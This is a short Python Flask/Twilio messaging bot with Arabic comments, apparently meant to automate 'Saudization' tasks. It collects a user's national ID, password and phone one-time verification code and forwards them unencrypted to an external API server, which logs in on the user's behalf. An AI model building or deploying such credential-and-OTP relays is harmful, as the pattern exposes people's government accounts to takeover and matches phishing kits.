# ✅ ملف app.py (لتشغيل البوت على Render)

from flask import Flask, request
from twilio.twiml.messaging_response import MessagingResponse
import requests
import os

app = Flask(__name__)

# متغيرات البيئة
TWILIO_PHONE_NUMBER = os.getenv("TWILIO_PHONE_NUMBER")
USER_PHONE_NUMBER = os.getenv("USER_PHONE_NUMBER")
API_SERVER_URL = os.getenv("API_SERVER_URL")

# حفظ حالة المستخدم
user_states = {}
user_credentials = {}

@app.route("/", methods=["POST"])
def bot():
    incoming_msg = request.values.get("Body", "").strip()
    sender = request.values.get("From", "")
    response = MessagingResponse()
    msg = response.message()

    state = user_states.get(sender, "start")

    if "سعودة" in incoming_msg or incoming_msg == "ابدأ":
        msg.body("📄 أرسل رقم الهوية وكلمة المرور بهذا الشكل:\n`رقم#كلمة`")
        user_states[sender] = "awaiting_login"

    elif state == "awaiting_login" and "#" in incoming_msg:
        try:
            national_id, password = incoming_msg.split("#")
            user_credentials[sender] = {
                "national_id": national_id,
                "password": password
            }
            requests.post(f"{API_SERVER_URL}/start-login", json={
                "sender": sender,
                "national_id": national_id,
                "password": password
            })
            msg.body("📲 أرسل الآن كود التحقق المرسل إلى جوالك")
            user_states[sender] = "awaiting_otp"
        except:
            msg.body("❌ تأكد من الصيغة: رقم#كلمة")

    elif state == "awaiting_otp" and incoming_msg.isdigit():
        credentials = user_credentials.get(sender, {})
        credentials["otp"] = incoming_msg
        requests.post(f"{API_SERVER_URL}/complete-login", json=credentials)
        msg.body("⏳ يتم تنفيذ السعودة الآن... انتظر")
        user_states[sender] = "processing"

    elif state == "processing":
        msg.body("⏳ يرجى الانتظار حتى يتم إكمال العملية")

    else:
        msg.body("👋 اكتب \"سعودة\" للبدء أو \"ابدأ\".")

    return str(response)


if __name__ == "__main__":
    app.run(debug=False, host="0.0.0.0", port=5000)
